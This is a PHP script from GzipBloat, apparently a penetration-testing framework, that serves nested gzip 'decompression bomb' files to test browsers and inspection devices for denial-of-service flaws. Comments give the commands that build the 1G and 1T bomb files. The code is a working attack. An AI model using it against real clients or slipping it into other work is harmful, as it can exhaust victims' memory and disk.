<?php

/*
    Copyright (C) 2013  Cyberis Ltd. Author geoff.jones@cyberis.co.uk

    This file is part of GzipBloat, a PHP framework to test User-Agents 
    and intermediary content inspection devices for denial-of-service 
    vulnerabilities with respect to HTTP response decompression.

    GzipBloat is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    GzipBloat is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

//You can create compressed files like this:
//bash$> dd if=/dev/zero bs=1G count=1 | gzip -9 > 1G.gzip
//bash$> dd if=/dev/zero bs=1G count=1024 | gzip -9 | gzip -9 | gzip -9 | gzip -9 > 1T.gzipx4
// ..or use makeGzips.sh

//Default options
$infile = "1G.gzip";
$rounds = 1;

if (isset($_REQUEST['contenttype'])) {
	$contenttype = filter_var($_REQUEST['contenttype'], FILTER_VALIDATE_REGEXP, array('options'=>array('regexp' => '/^[A-Z\-\/]+$/i')));
	header("Content-Type: $contenttype");
}

if (isset($_REQUEST['filename'])) {
	$filename = filter_var($_REQUEST['filename'], FILTER_VALIDATE_REGEXP, array('options'=>array('regexp' => '/^[A-Z0-9\. ]+$/i')));
	header("Content-Disposition: attachment; filename=\"$filename\"");
}

if (isset($_REQUEST['infile'])) {
	$infile = filter_var($_REQUEST['infile'], FILTER_VALIDATE_REGEXP, array('options'=>array('regexp' => '/^[0-9]+[A-Z]\.gzip(x[0-9]+)?+$/i')));
	if (!is_readable($infile)) {
		die("[ERROR] Cannot read selected file - have you created it??");
	}
}

if (isset($_REQUEST['rounds'])) {
	$rounds = filter_var($_REQUEST['rounds'], FILTER_VALIDATE_REGEXP, array('options'=>array('regexp' => '/^[0-9]{1,4}$/')));
}

$encoding = "gzip";
for ($i = 1; $i < $rounds; $i++) {
        $encoding = $encoding . ", gzip";
}

header("Content-Encoding: ".$encoding);
header("Content-Length: ".filesize($infile));

//Turn off output buffering
if (ob_get_level()) ob_end_clean();

readfile($infile);

?>
